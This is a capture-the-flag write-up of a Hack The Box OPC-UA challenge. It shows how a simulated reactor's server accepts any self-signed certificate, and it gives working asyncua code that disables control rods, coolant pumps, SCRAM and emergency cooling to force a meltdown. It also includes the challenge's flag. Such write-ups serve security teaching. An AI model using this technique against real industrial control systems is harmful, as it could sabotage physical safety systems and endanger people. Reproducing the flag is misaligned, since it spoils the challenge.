# Hack The Box: Dressrosa Reactor
*Category: Hardware / ICS-SCADA (OPC-UA)*
*Difficulty: Medium*
*Author: Atlas*

---

## 📝 Description
> The Dressrosa Reactor hums with stability, quietly generating power under tight control. But beneath its calm surface lies an exploitable weakness. Breach the OPC-UA PLC interface, seize control of the system, and trigger a meltdown.
>
> `154.57.164.78:30567`
> `154.57.164.78:32086`

Two exposed ports on a simulated nuclear plant: one turned out to be a read-only SCADA HMI dashboard, the other the actual OPC-UA server driving the plant simulation.

---

## 🧠 TL;DR
- Vulnerability: The OPC-UA server enforced an encrypted (`Basic256Sha256`/SignAndEncrypt) channel, but never validated the client certificate against a trust list — *any* self-signed certificate was accepted, and every safety-critical PLC tag was writable with no access control on top of that.
- Exploit: Connect anonymously with a throwaway self-signed cert, then write directly to `controlRods.insertedPercentage`, `coolantPumps.primaryPump/secondaryPump`, `scramSystem.armed`, and `emergencyCoreCooling.status` to sabotage every safety system at once.
- Outcome: The backend physics simulation drove core temperature/pressure past failure thresholds, `reactorStatus` flipped to `False`, and the flag was pushed out over the SCADA dashboard's Socket.IO `reactor_update` event.
- Flag: `HTB{1N53CUR3_TRU57L157_M3L7D0WN}`

---

## 🔍 Enumeration

### Nmap
```bash
nmap -sV -sC -p30567,32086 154.57.164.78
```
```
PORT      STATE SERVICE VERSION
30567/tcp open  unknown
32086/tcp open  http    Werkzeug httpd 3.1.5 (Python 3.12.3)
|_http-title: Nuclear Reactor SCADA - Dressrosa Nuclear Facility
|_http-server-header: Werkzeug/3.1.5 Python/3.12.3
```
Port 32086 is a Flask/Werkzeug web app; port 30567 is unidentified by nmap's service probes, which is typical for raw OPC-UA binary traffic.

### Web HMI (32086)
Pulling the page source showed a Socket.IO client subscribing to a single `reactor_update` event and rendering reactor telemetry (core temp, pressure, rod position, pump status, etc.) read-only:
```js
socket.on("reactor_update", function (data) {
  currentData = data;
  updateDisplay(data);
  ...
});

function updateDisplay(data) {
  if (data.flag) {
    document.getElementById("flag").innerHTML = data.flag;
  }
  ...
}
```
Key finding: `data.flag` is only populated by the *server* once some backend condition is met — there is no exploitable logic client-side. This dashboard is purely a spectator view; the actual attack surface is the OPC-UA endpoint feeding it.

### OPC-UA endpoint (30567)
`asyncua` (installed in a venv, since Kali's system Python is externally managed) was used to query the server's supported endpoints before attempting a session:

**Input:**
```python
client = Client(url="opc.tcp://154.57.164.78:30567")
endpoints = await client.connect_and_get_server_endpoints()
```
**Output:**
```
EndpointUrl: opc.tcp://10.244.28.101:4840
  SecurityMode: 3
  SecurityPolicyUri: http://opcfoundation.org/UA/SecurityPolicy#Basic256Sha256
```
Only one endpoint, requiring `SignAndEncrypt` with `Basic256Sha256` — an anonymous, unencrypted connection attempt was rejected outright (`No matching endpoints: 1, .../SecurityPolicy#None`). This suggested a real certificate was mandatory, which is the norm for hardened OPC-UA deployments.

**Input:** Generate a throwaway self-signed client certificate — no attempt was made to obtain a "trusted" one, since the goal was to test whether the server actually validated the chain at all:
```bash
openssl req -x509 -newkey rsa:2048 -keyout client_key.pem -out client_cert.pem -days 365 -nodes \
  -subj "/CN=client/O=CTF/C=US" \
  -addext "subjectAltName=URI:urn:client:ctf:client,DNS:client" \
  -addext "keyUsage=digitalSignature,nonRepudiation,keyEncipherment,dataEncipherment,keyCertSign" \
  -addext "extendedKeyUsage=serverAuth,clientAuth"
```

**Input:** Connect using that cert and browse the address space ([recon_opcua.py](recon_opcua.py)):
```python
client = Client(url="opc.tcp://154.57.164.78:30567")
await client.set_security_string(
    "Basic256Sha256,SignAndEncrypt,client_cert.pem,client_key.pem"
)
async with client:
    print(await client.get_namespace_array())
```
**Output:**
```
certificate does not contain the application uri (...). Most applications will reject a connection without it.
certificate does not contain the hostname in DNSNames kali. Some applications will check this.
Connected. Namespaces: ['http://opcfoundation.org/UA/', 'urn:freeopcua:python:server', 'main']
```
The server logged complaints about the certificate's SAN/hostname mismatch — and connected anyway. **No trust list enforcement whatsoever**: any self-signed cert satisfies the "encrypted channel" requirement, with zero identity verification behind it.

Browsing the `Objects` node (namespace 2, `"main"`) revealed the full plant model:
```
reactorCore/          corePressure_MPa, coreTemperature_C, reactorPower_MWth,
                       fuelRods.{count, averageTemperature_C, averagePower_MW},
                       controlRods.{count, insertedPercentage, material}
coolingSystem/         primaryCoolant.*, secondaryCoolant.*, coolantPumps.{running, total, primaryPump, secondaryPump}
turbineGenerator/      turbineRPM, generatorOutput_MWe, condenserPressure_kPa, steamFlowRate_kgPerSec
containmentSystem/     containmentPressure_kPa, radiationLevel_uSvPerHr
safetySystems/         emergencyCoreCooling.{status, waterInventory_m3},
                       scramSystem.{armed, lastScramTimestamp},
                       radiationMonitoring.*
spentFuelPool/         temperature_C, waterLevel_m, radiationLevel_uSvPerHr
reactorStatus                (top-level bool)
```

---

## 💥 Exploitation

A quick write-back test on the five safety-critical nodes (writing each node's current value to itself) confirmed **no write-access restrictions** existed on any of them:
```
controlRods.insertedPercentage  -> write of same value SUCCEEDED (writable)
coolantPumps.primaryPump        -> write of same value SUCCEEDED (writable)
coolantPumps.secondaryPump      -> write of same value SUCCEEDED (writable)
scramSystem.armed               -> write of same value SUCCEEDED (writable)
emergencyCoreCooling.status     -> write of same value SUCCEEDED (writable)
```

**Input:** Sabotage every safety system in one pass ([exploit_opcua.py](exploit_opcua.py)):
```python
await rods.write_value(0.0, ua.VariantType.Double)           # withdraw control rods fully
await primary_pump.write_value(False, ua.VariantType.Boolean)   # kill primary coolant pump
await secondary_pump.write_value(False, ua.VariantType.Boolean) # kill secondary coolant pump
await scram.write_value(False, ua.VariantType.Boolean)          # disarm SCRAM
await ecc.write_value(False, ua.VariantType.Boolean)            # disable emergency core cooling
```
**Output:**
```
All safety systems sabotaged. Reading back values:
  rods = 0.0
  primary_pump = False
  secondary_pump = False
  scram = False
  ecc = False
```
All five writes were accepted with no error, no auth prompt, and no rollback — the "PLC" trusted every write from any connected client unconditionally.

**Input:** Watch the SCADA dashboard's live feed for the resulting meltdown and flag emission ([monitor_flag.py](monitor_flag.py)):
```python
sio.on("reactor_update", lambda data: print(data["reactorCore"]["coreTemperature_C"], data.get("flag")))
sio.connect("http://154.57.164.78:32086")
```
**Output:**
```
temp=426.10 pressure=21.25 fuelTemp=580.2 rods=0.0 status=True
temp=428.99 pressure=21.52 fuelTemp=580.2 rods=0.0 status=True
temp=434.58 pressure=21.76 fuelTemp=580.2 rods=0.0 status=True
temp=439.21 pressure=21.89 fuelTemp=580.2 rods=0.0 status=True
temp=446.58 pressure=22.42 fuelTemp=580.2 rods=0.0 status=True
temp=450.89 pressure=22.47 fuelTemp=580.2 rods=0.0 status=False
!!!!! FLAG FOUND: HTB{1N53CUR3_TRU57L157_M3L7D0WN}
```
With control rods withdrawn, both pumps off, SCRAM disarmed, and ECC disabled, the backend's physics simulation had nothing left to counteract rising core temperature/pressure. Within a few update ticks (each ~1s) the core crossed its failure threshold, `reactorStatus` flipped `False`, and the server pushed the flag out on the very next `reactor_update` broadcast.

### Solution

**Answer:** `HTB{1N53CUR3_TRU57L157_M3L7D0WN}`

**Summary:** The challenge modeled a classic ICS/OT weakness: an OPC-UA server correctly *required* an encrypted SignAndEncrypt channel, but implemented none of the certificate trust validation that requirement is supposed to buy you — connecting with a throwaway, unrelated self-signed cert was sufficient to establish a full session. From there, every safety-critical PLC tag (control rod position, both coolant pumps, SCRAM arming, emergency core cooling) was writable by that session with no further authentication or authorization check. Zeroing the rods and killing every safety system simultaneously let the simulated reactor physics do the rest, and the flag was recovered by watching the operator dashboard's own real-time feed rather than interacting with the web app directly.

**Scripts:**
- [recon_opcua.py](recon_opcua.py) — connects with a self-signed cert and dumps the full OPC-UA address space/values.
- [exploit_opcua.py](exploit_opcua.py) — writes the five safety-critical tags to trigger meltdown.
- [monitor_flag.py](monitor_flag.py) — Socket.IO client that watches `reactor_update` events and prints the flag once emitted.

---

## Dead Ends & Lessons Learned

| Approach Tried | Why It Failed | What We Learned |
|---|---|---|
| Anonymous, unencrypted OPC-UA connection (`SecurityPolicy#None`) | Server only advertised a `Basic256Sha256`/SignAndEncrypt endpoint and rejected the request outright | Always enumerate `GetEndpoints` before assuming a "PLC-looking" port is unauthenticated — many OPC-UA stacks reject unencrypted sessions by policy even if they don't actually verify identity |
| Assuming the web dashboard (32086) was the attack surface | It's Socket.IO push-only; no writable API or form actually mutates plant state | For SCADA/HMI-style web apps, check whether the UI is a live *view* of a separate control-plane protocol (OPC-UA/Modbus/DNP3) before spending time on the web app itself |

---

## Flag Summary

| Part | Answer | Explanation |
|------|--------|-------------|
| Reactor Meltdown | `HTB{1N53CUR3_TRU57L157_M3L7D0WN}` | Bypassed OPC-UA certificate trust validation with a self-signed cert, then wrote to unrestricted safety-system tags (control rods, coolant pumps, SCRAM, ECC) to force a simulated core meltdown; flag was emitted over the SCADA dashboard's Socket.IO feed. |

---

## References
- OPC Foundation, OPC-UA Part 2: Security — certificate/trust-list validation requirements for SignAndEncrypt channels
- [`asyncua`](https://github.com/FreeOpcUa/opcua-asyncio) Python library — client used for all OPC-UA enumeration and writes
- `python-socketio` client library — used to observe the SCADA dashboard's live telemetry/flag feed
